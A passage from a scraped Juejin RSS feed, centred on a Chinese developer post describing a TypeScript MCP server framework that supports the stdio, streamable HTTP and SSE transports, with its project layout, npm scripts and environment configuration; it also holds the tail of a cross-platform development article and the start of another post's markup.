<p><strong>选择技术的核心是：在当前约束条件下，哪个方案的收益最大。</strong></p>
<h3 data-id="heading-24">7.2 聚焦</h3>
<p>没有项目需要超过2种跨平台框架同时使用。</p>
<p>同样也不推荐团队同时在多个不同的跨平台框架上投入时间和精力。</p>
<p><strong>建议：选定一个主力技术栈，最多再备一个备选方案。</strong></p>
<h3 data-id="heading-25">7.3 长期主义</h3>
<p>真正决定项目生死的，是你选定技术栈之后做的那些事。</p>
<ul>
<li><strong>架构设计够不够清晰？</strong></li>
<li><strong>开发流程够不够规范？</strong></li>
<li><strong>代码规范够不够严格？</strong></li>
<li><strong>技术债务管理够不够及时？</strong></li>
</ul>
<p>选定技术栈不是终点，而是起点。</p>
<p>做好这些基础建设，才是项目能持续健康演进的根本。</p>
<p>否则，再好的技术栈也救不了你。</p>
<p>最后，希望这篇跨平台开发地图能帮你避开那些坑，找到最适合你的路。</p>
<blockquote>
<p>如果看到这里的同学对客户端或者Flutter开发感兴趣，欢迎联系老刘，我们互相学习。</p>
<p>私信免费领老刘整理的《Flutter开发手册》，覆盖90%应用开发场景。</p>
<p>可以作为Flutter学习的知识地图。</p>
<p>—— laoliu_dev</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【MCP】同时支持stdio，streamableHttpless和sse三种协议的MCP服务框架]]></title>    <link>https://juejin.cn/post/7597623392456097843</link>    <guid>https://juejin.cn/post/7597623392456097843</guid>    <pubDate>2026-01-21T09:38:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623392456097843" data-draft-id="7597622924272173083" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【MCP】同时支持stdio，streamableHttpless和sse三种协议的MCP服务框架"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2026-01-21T09:38:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东云开发者"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【MCP】同时支持stdio，streamableHttpless和sse三种协议的MCP服务框架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东云开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:38:31.000Z" title="Wed Jan 21 2026 09:38:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作者：蔡欣彤</p>
<h2 data-id="heading-0">项目说明</h2>
<p>这是一个同时支持stdio，streamableHttpless和sse三种协议的MCP-Server的框架（ts语言）。</p>
<p>为什么我想做这个框架呢？因为随着AI发展，现在越来越多业务需要和AI相结合。而我在做AI应用中发现，MCP服务在AI方向的业务使用频率很高，但随着业务的加深，发现存在以下痛点：</p>
<p>1.针对不同业务，对于mcp-server需要的类型不同，有的就需要stdio，有的需要网络请求</p>
<p>2.不同平台对MCP服务协议要求不同，有支持streamableHttp，有仅支持sse的。</p>
<p>这两种情况，会出现相同功能重复开发，重复造轮子，浪费时间成本</p>
<ol start="3">
<li>此外，有些研发人员目前并不了解MCP，在业务开发时候需要现学</li>
</ol>
<p>而这会让研发周期加长，时间成本耗费过多</p>
<p>所以为了解决以上痛点，我从0-1搭建了这个框架。<strong>这个框架特点</strong>：</p>
<p>1.同时支持stdio，streamableHttpless和sse三种模式，实现一次开发支持三种模式</p>
<p>2.所有功能都拆分为独立模块。这样即使不懂的人，只要在指定的文件里面编写业务逻辑，就可以创造自己的mcp服务</p>
<p>3.支持环境变量，可通过环境变量配置域名，服务地址，端口和host，真正适用于生产使用</p>
<p>4.切换模式也很简单，只要在启动脚本根据需要，切换启动命令即可，改动成本近乎无</p>
<p>5.添加日志模块，方便查阅启动和服务调用情况</p>
<p>6.同时添加行云脚本，支持行云部署</p>
<p>github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FXingtongCai%2Fmcp-server-ts" target="_blank" title="https://github.com/XingtongCai/mcp-server-ts" ref="nofollow noopener noreferrer">github.com/XingtongCai…</a>﻿</p>
<p>coding地址： <a href="https://link.juejin.cn?target=http%3A%2F%2Fxingyun.jd.com%2FcodingRoot%2Fjdcloud-fe%2Fmcp-server%2Ftree%2Fmain%2Fdemo" target="_blank" title="http://xingyun.jd.com/codingRoot/jdcloud-fe/mcp-server/tree/main/demo" ref="nofollow noopener noreferrer">xingyun.jd.com/codingRoot/…</a></p>
<h2 data-id="heading-1">内容介绍</h2>
<p>整个框架的结构很简单，就如下这些：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment">## 目录结构</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">build:</span> <span class="hljs-string">编译之后的文件</span>
<span class="hljs-bullet">-</span> <span class="hljs-string">src</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">router:</span> <span class="hljs-string">配置streamableHttp和sse协议的路由</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">注册streamableHttp路由入口</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">mcp.ts:</span> <span class="hljs-string">streamableHttp的配置路径，具体为`process.env.MCP_BASE_PATH`的路径请求,如果没有配置，默认/mcp。如果有需要添加二级路径，例如</span> <span class="hljs-string">/mcp/event，需要在这里面添加一下/event,如果一级不用动</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">sse.ts:</span> <span class="hljs-string">sse的配置路径，具体为`process.env.MCP_BASE_PATH`的路径请求,如果没有配置，默认/mcp。如果有需要添加二级路径，例如</span> <span class="hljs-string">/mcp/event，需要在这里面添加一下/event,如果一级不用动</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">tools:</span> <span class="hljs-string">mcp的工具</span> 
   <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">注册工具</span>
   <span class="hljs-string">--</span> <span class="hljs-attr">mockFunc.ts:</span> <span class="hljs-string">模拟一个工具写法</span> <span class="hljs-bullet">-</span> <span class="hljs-string">这部分需要根据业务开发</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">cli.ts:</span> <span class="hljs-string">命令行解析工具</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">index.ts:</span> <span class="hljs-string">总入口</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">server.ts:</span> <span class="hljs-string">创建Mcp服务</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">sse.ts:</span> <span class="hljs-string">运行sse模式</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">stdio.ts:</span> <span class="hljs-string">运行stdio模式</span>
 <span class="hljs-string">--</span> <span class="hljs-attr">streamableHttp.ts:</span> <span class="hljs-string">运行streamableHttp模式</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">xingyun/bin :</span> <span class="hljs-string">是根据我们业务使用的部署工具开发的部署脚本</span> <span class="hljs-bullet">-</span> <span class="hljs-string">这部分需要根据实际部署平台更改，我这个支持行云部署</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">build_xingyun.sh:</span> <span class="hljs-string">是根据我们业务使用的部署工具开发的部署脚本</span> <span class="hljs-bullet">-</span> <span class="hljs-string">这部分需要根据实际部署平台更改，我这个支持行云部署</span>
</code></pre>
<h3 data-id="heading-2">启动服务方式</h3>
<p>a.本地启动</p>
<p>1.启动stdio: npm run start 是默认启动stdio</p>
<p>2.启动StreamableHttp: npm run start:http 是默认启动端口3001</p>
<p>3.更改端口启动StreamableHttp: npm run dev:http 或者 npm run start -- -t http -p 3001</p>
<p>-t httt: 代表启动StreamableHttp</p>
<p>-p 3001: 代表启动端口3001</p>
<p>4.启动sse: npm run start:sse 是默认启动端口3001</p>
<p>﻿</p>
<p>b.部署启动</p>
<p>我在 xingyun/bin/control.sh中写的启动脚本，这段代码是启动streamableHttpless的，如果需要启动sse，需要改为 <code>npm run start:sse</code></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">start</span>(<span class="hljs-params"/>){
    npm run <span class="hljs-attr">start</span>:http
    sleep <span class="hljs-number">3</span>
    status
}
</code></pre>
<h3 data-id="heading-3">生产环境配置</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 监听特定内网IP（例如：192.168.1.100）</span>
export <span class="hljs-attr">MCP_HOST</span>=<span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span>
export <span class="hljs-attr">MCP_PORT</span>=<span class="hljs-number">3001</span>

<span class="hljs-comment"># 使用内网域名（可选）</span>
export <span class="hljs-attr">MCP_DOMAIN</span>=mcp-server.internal.com

<span class="hljs-comment"># 修改基础路径（可选，默认是 /mcp）</span>
export <span class="hljs-attr">MCP_BASE_PATH</span>=/api/mcp
</code></pre>

<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">### 端口配置优先级</span>
<span class="hljs-bullet">1.</span> 环境变量 <span class="hljs-code">`MCP_PORT`</span>（最高优先级）
<span class="hljs-bullet">2.</span> 命令行参数 <span class="hljs-code">`--port`</span> 
<span class="hljs-bullet">3.</span> 默认值：3001端口

<span class="hljs-section">### 访问地址优先级</span>
<span class="hljs-bullet">1.</span> 环境变量 <span class="hljs-code">`MCP_DOMAIN`</span>（最高优先级）
<span class="hljs-bullet">2.</span> 环境变量 <span class="hljs-code">`MCP_HOST`</span>
<span class="hljs-bullet">3.</span> 默认: localhost
</code></pre>

<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment">### 内网访问方式</span>
假设你的内网服务器IP是 <span class="hljs-string">`192.168.1.100`</span>，端口是 <span class="hljs-string">`3001`</span>：

**基础访问：**
<span class="hljs-string">``</span><span class="hljs-string">`
http://192.168.1.100:3001/sales
`</span><span class="hljs-string">``</span>

**带域名的访问：**
<span class="hljs-string">``</span><span class="hljs-string">`
http://mcp-server.internal.com/sales
`</span><span class="hljs-string">``</span>

**自定义路径：**
<span class="hljs-string">``</span><span class="hljs-string">`
http://192.168.1.100:3001/api/mcp
</span></code></pre>
<p>﻿</p>
<h2 data-id="heading-4">项目关键代码说明</h2>
<p>这个是package.json文件，也是我们一开始要看的，<code>cli.js</code>这个文件是我们启动文件，也是解析命令行的工具，真实区分的地方在index.ts文件中</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-string">"scripts"</span>: {
    <span class="hljs-string">"build"</span>: <span class="hljs-string">"tsc &amp;&amp; chmod 755 build/src/index.js  build/src/cli.js"</span>,
    <span class="hljs-string">"start"</span>: <span class="hljs-string">"node ./build/src/cli.js"</span>,
    <span class="hljs-string">"start:http"</span>: <span class="hljs-string">"node ./build/src/cli.js --transport http"</span>,
    <span class="hljs-string">"start:sse"</span>: <span class="hljs-string">"node ./build/src/cli.js --transport sse"</span>,
    <span class="hljs-string">"dev:http"</span>: <span class="hljs-string">"node ./build/src/cli.js  --transport http --port 3002"</span>,
    <span class="hljs-string">"stop"</span>: <span class="hljs-string">"pkill -f "</span>demo<span class="hljs-string">" || true"</span>,
    <span class="hljs-string">"restart"</span>: <span class="hljs-string">"npm run stop &amp;&amp; npm run start:http"</span>,
    <span class="hljs-string">"inspector"</span>: <span class="hljs-string">"npx @modelcontextprotocol/inspector"</span>
  },
</code></pre>
<p>index.ts 的关键代码，在这区分不同模式，然后进入到各自的处理模块。各自模块就是调用sdk，配置域名等操作，代码过长，不展示了，但是这几个文件不用动。</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2cb41c9ab1f43cb8003b7a55d2da5c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=64U%2F63owQPqDg1qCgGtuIPgfhxo%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>StreamableHttp.ts我支持的是less，就是我不需要sessionId，如果有需要的，这块需要再自己改一下！！</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58a67479b3744fc28cc4a9c8305cc833~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=k%2B243HbNiZoeP%2BqTorir43ZVMuc%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>server.ts 是创建mcp服务，同时注册tools工具，三个模式都需要使用的公共文件</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17c4017b136d43069edeba04b3594350~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=3eRQhTFVg%2B817b1%2BTCIUuYZ7SIo%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>tools/index.ts, 作为工具入口，一个工具一个注册</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b96c33a7fe4427cb0e3c145ff461fae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=rkr6hZiO51D5UWcGFAcXoGPfM2E%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>router文件夹下路由注册，是为了sse和streamableless的路由。</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a54b087acf6049cfa6e3270caab3c9a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=uqe0GB8Ka8nH8BAuauwi7Jvdkoc%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>其中streamable的index.ts文件里面关键内容，其中basePath就是你的基础路径，通过定义指定访问路径。</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd93c0f813104a1fad1cc790fe568a3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=k6y2m1pt%2BY5OtJtRD6Xr2dZumuo%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>sse的在sse.ts文件中，定义了get和post的方法</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3bce4f93d2304ef68d7ea0307a16deb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=%2BF9p0GfSAE%2BlA%2F%2FPKCRJhCLA3sI%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>其实整个框架到这关键的代码就说完了。剩下xingyun的就是在行云平台部署和启动需要的脚本，这里就不介绍了</p>
<p>﻿</p>
<h2 data-id="heading-5">成果展示</h2>
<p>1.stdio - 发布了依赖包，并用joycode成功联通</p>
<p>﻿<a href="https://link.juejin.cn?target=https%3A%2F%2Fnpm.m.jd.com%2Fpackage%2F%40jd%2Fdemo-mcp-server" target="_blank" title="https://npm.m.jd.com/package/@jd/demo-mcp-server" ref="nofollow noopener noreferrer">npm.m.jd.com/package/@jd…</a></p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9cb4ed9288f4487955473f6263efdbd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=bKoQRbfKOBJbn32B1oc%2B97GQosU%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>﻿</p>
<p>2.streamableHttp - joycode成功联通并且可以运行</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a47fce5ada64429c95e69c6597fc5696~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=ViBE7J%2BGIxuuoov%2FBLibMU9RC6s%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62b6a24de7e2462c8272790aaf7f5dc2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=ilvg5%2FGO6kt036zC86ep7k0GMBg%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>﻿</p>
<p>3.sse - autobots支持sse模式，用这个框架开发了在业务中使用的 权限拦截MCP,并成功在autobots引入</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/526475363b124af989347ad39e5701f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=EzHQP7aiJgSrbOounoWvrYzRrcc%3D" alt="" loading="lazy"/></p>
<p>﻿﻿</p>
<p>﻿</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5fb4a980fd25441e9cad68d9f8781434~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593110&amp;x-signature=uZ1tb%2F%2F5ftQyrm6NlHRcDcHqHVw%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[618 大促技术实践：定时任务异常重试的探索与沉淀]]></title>    <link>https://juejin.cn/post/7597642574933524489</link>    <guid>https://juejin.cn/post/7597642574933524489</guid>    <pubDate>2026-01-21T09:37:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597642574933524489" data-draft-id="7597623395907387438" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="618 大促技术实践：定时任务异常重试的探索与沉淀​"/> <meta itemprop="keywords" content="程序员"/> <meta itemprop="datePublished" content="2026-01-21T09:37:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东云开发者"/> <meta itemprop="url" content="https://juejin.cn/user/2634854380340008"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            618 大促技术实践：定时任务异常重试的探索与沉淀​
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2634854380340008/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东云开发者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:37:42.000Z" title="Wed Jan 21 2026 09:37:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body 